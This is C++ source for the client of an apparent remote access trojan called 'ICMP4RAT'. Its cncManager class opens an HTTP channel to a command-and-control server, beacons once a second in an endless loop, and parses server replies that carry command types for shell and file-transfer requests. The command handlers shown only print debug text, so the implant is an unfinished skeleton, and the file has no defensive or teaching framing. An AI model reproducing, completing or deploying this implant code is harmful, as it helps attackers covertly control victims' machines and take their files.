#include <iostream>
#include <string>
#include <map>
#include <ole2.h>
#include <olectl.h>
#include "cncManager.h"

cncManager::cncManager() {
	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (this->hSession)
		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

	if (this->hConnect)
		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
}

cncManager::cncManager(LPCWSTR server) {
	this->server = server;
	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (this->hSession)
		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

	if (this->hConnect)
		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
}

cncManager::~cncManager() {
    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
    if (this->hSession) WinHttpCloseHandle(this->hSession);
}


void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);

    if (this->bResults)
        this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);

    if (!this->bResults)
        std::cout << "Error" << GetLastError() << "has occurred." << std::endl;

    if (this->bResults)
    {
        do
        {
            /*Check for available data.*/
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // No more available data.
            if (!dwSize)
                break;

            // Allocate space for the buffer.
            LPSTR pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }

            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                printf("Error %u in WinHttpReadData.\n", GetLastError());

            else
                //std::wcout << pszOutBuffer << std::endl;
                this->responseParser((UCHAR *)pszOutBuffer, dwSize);

            delete[] pszOutBuffer;

            if (!dwDownloaded)
                break;

        } while (dwSize > 0);
    }
}   
 
void cncManager::sendBeacon() {
	DDprotocol* beaconFrame = new DDprotocol;
	beaconFrame->type = beaconRequest;
	beaconFrame->len = 0;
	beaconFrame->seq = 0;

	while (TRUE) {
		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
		Sleep(1000);
	}
}

void cncManager::responseParser(UCHAR* res, DWORD len) {
    if (len < 8)
        std::cout << "Invalid Protocol !!!" << std::endl;
    
    else
    {
        DDprotocol* resData = new DDprotocol;
        resData->header = res[0];
        resData->type = res[1];
        resData->len = *(USHORT *)(res+2);
        resData->seq = *(DWORD *)(res+4);
        /* For DEBUG */
        printf("-------------------\n");
        printf("header : 0x%x\ntype   : 0x%x\nlen    : 0x%x\nseq    : 0x%x\n", resData->header, resData->type, resData->len, resData->seq);
        printf("-------------------\n");

        if (resData->header != DDPROTO_HEADER)
            std::cout << "Invalid Header !!!" << std::endl;
        

        else {
            switch (resData->type)
            {
            case error:
                std::cout << "error request !!!" << std::endl;
                break;

            case beaconResponse:
                std::cout << "beaconResponse !!!" << std::endl;
                break;

            case shellRequest:
                std::cout << "shellRequest !!!" << std::endl;
                break;

            case ftpReqeust:
                std::cout << "ftpReqeust !!!" << std::endl;
                break;

            default:
                std::cout << "Invalid type !!!" << std::endl;
                break;
            }

            delete resData;
        }
    }

}


int main() {
	cncManager client;
	client.sendBeacon();
    
  
}